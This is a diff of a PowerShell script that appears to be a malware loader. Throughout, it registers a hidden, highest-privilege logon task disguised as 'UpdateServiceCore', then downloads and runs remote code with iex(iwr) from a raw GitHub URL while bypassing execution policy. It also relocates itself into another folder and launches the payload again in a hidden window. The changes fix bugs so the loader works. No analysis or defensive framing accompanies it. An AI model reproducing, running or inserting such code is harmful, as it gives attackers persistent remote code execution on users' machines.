@@ -1,10 +1,11 @@
-Set-Location $currentDir
-$otherFolders = Get-ChildItem -Directory | Where-Object { $_.Name -ne [System.IO.Path]::GetFileNameWithoutExtension($scriptPath) }
-$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $scriptPath = $MyInvocation.MyCommand.Path
 $currentDir = Split-Path $scriptPath -Parent
+Set-Location $currentDir
 
-$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code' -UseBasicP)"
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$otherFolders = Get-ChildItem -Directory | Where-Object { $_.Name -ne [System.IO.Path]::GetFileNameWithoutExtension($scriptPath) }
+
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')"
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -StartWhenAvailable -AllowStartIfOnBatteries
@@ -12,11 +13,12 @@ $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -StartWhenA
 Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "UpdateServiceCore" -Description "Runs script on logon" -Force -Settings $settings
 Start-ScheduledTask -TaskName "UpdateServiceCore"
 
-
 if ($otherFolders.Count -gt 0) {
-    $targetFolder = $otherFolders[0]
-    Move-Item -Path $scriptPath -Destination $targetFolder -Force
+    $targetFolder = $otherFolders[0].FullName
+    $destinationPath = Join-Path $targetFolder (Split-Path $scriptPath -Leaf)
+    Move-Item -Path $scriptPath -Destination $destinationPath -Force
     Set-Location $targetFolder
 }
-powershell -w h -ep -c "iex (iwr 'raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code' -UseB)"
+
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')"
 exit
